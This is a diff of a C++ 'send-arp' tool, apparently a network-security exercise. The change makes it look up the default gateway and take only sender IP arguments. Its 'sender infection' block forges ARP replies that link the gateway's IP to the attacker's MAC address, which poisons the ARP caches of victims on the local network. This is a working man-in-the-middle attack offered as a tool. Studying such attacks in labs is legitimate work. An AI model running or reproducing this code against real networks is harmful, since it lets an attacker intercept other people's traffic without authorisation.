@@ -20,27 +20,28 @@ Etharp sendpacket(WMac dmac, WMac smac, WMac tmac,WIp tip, WIp sip){
 }
 int main(int argc, char* argv[]){
 
-    if((argc-3)%2!=0){
-        printf("syntax : send-arp <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
+    if(argc<2){
+        printf("syntax : send-arp <sender ip> [<sender ip 2>  ...]\n");
         printf("sample : send-arp 192.168.10.2 192.168.10.1\n");
         exit(1);
     }
 
-    int cnt = (argc-1)/2;
     vector <flow> vector;
-    for(int i = 0;i < cnt; i++){
+    WNetInfo& wnetinfo = WNetInfo::instance();
+    WRtm& rtm = wnetinfo.rtm();
+    WRtmEntry* rtmentry = rtm.getBestEntry(WIp("8.8.8.8"));
+
+    WIp tip_ = rtm.findGateway(rtmentry->intf()->name(),WIp("8.8.8.8"));
+
+    WPcapDevice device;
+    device.intfName_ = rtmentry->intf()->name();
+
+    for(int i = 0;i < argc-1; i++){
 
         struct flow flow;
-        flow.sip_ = WIp(argv[2*i+1]);
-        flow.tip_ = WIp(argv[2*i+2]);
+        flow.sip_ = WIp(argv[i+1]);
         vector.push_back(flow);
 
-        WNetInfo& wnetinfo = WNetInfo::instance();
-        WRtm& rtm = wnetinfo.rtm();
-        WRtmEntry* rtmentry = rtm.getBestEntry(flow.tip_);
-
-        WPcapDevice device;
-        device.intfName_ = rtmentry->intf()->name();
         device.open();//can find mymac, myip
 
         //find sender's mac
@@ -64,7 +65,7 @@ int main(int argc, char* argv[]){
         }
 
         //sender infection
-        etharp = sendpacket(flow.smac_,device.intf()->mac(),flow.smac_,flow.sip_,flow.tip_);
+        etharp = sendpacket(flow.smac_,device.intf()->mac(),flow.smac_,flow.sip_,tip_);
         packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
         packet.buf_.size_ = sizeof(Etharp);
         device.write(packet.buf_);
